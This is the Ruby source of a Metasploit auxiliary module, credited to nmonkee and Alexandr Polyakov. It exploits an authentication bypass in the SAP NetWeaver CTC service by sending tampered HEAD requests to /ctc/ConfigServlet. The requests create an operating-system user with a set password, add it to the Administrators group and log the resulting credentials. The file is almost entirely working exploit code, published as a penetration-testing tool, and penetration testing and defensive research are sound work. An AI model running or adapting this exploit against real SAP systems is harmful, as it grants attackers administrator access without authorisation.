##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP CTC Service Verb Tampering User Management',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in SAP NetWeaver
        CTC service. The service is vulnerable to verb tampering allowing for unauthorised
        OS user management. Information about resolution should be available at SAP notes
        1589525 and 1624450 (authentication required).
      },
      'References' =>
        [
          [ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ],
          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf' ]
        ],
      'Author' =>
        [
          'Alexandr Polyakov', # Vulnerability discovery
          'nmonkee' # Metasploit module
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(50000),
      OptString.new('USERNAME', [true, 'Username to create', 'msf']),
      OptString.new('PASSWORD', [true, 'Password for the new user', '$Metasploit1234$']),
      OptString.new('GROUP', [true, 'Group for the new user', 'Administrators'])
    ], self.class)
  end

  def run_host(ip)
    vprint_status("#{rhost}:#{rport} - Creating User...")
    uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']
    if send_request(uri)
      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} with password #{datastore['PASSWORD']} successfully created")
    else
      return
    end

    vprint_status("#{rhost}:#{rport} - Adding User to Group...")
    uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USERNAME'] + ',GROUPNAME=' + datastore['GROUP']
    if send_request(uri)
      print_good("#{rhost}:#{rport} - User #{datastore['USERNAME']} added to group #{datastore['GROUP']}")
    else
      return
    end

    report_auth_info(
      :host => rhost,
      :port => rport,
      :user => datastore['USERNAME'],
      :pass => datastore['PASSWORD'],
      :ptype => "password",
      :active => true
    )
  end

  def send_request(uri)
    begin
      res = send_request_cgi({
        'uri' => uri,
        'method' => 'HEAD',
        'ctype' => 'text/xml; charset=UTF-8',
        'cookie' => 'sap-usercontext=sap-language=EN'
      })
      if res and res.code == 200 and res.headers['Server'] =~ /SAP J2EE Engine/
        return true
      elsif res
        vprint_error("#{rhost}:#{rport} - Unexpected Response: #{res.code} #{res.message}")
        return false
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Unable to connect")
      return false
    end
  end
end
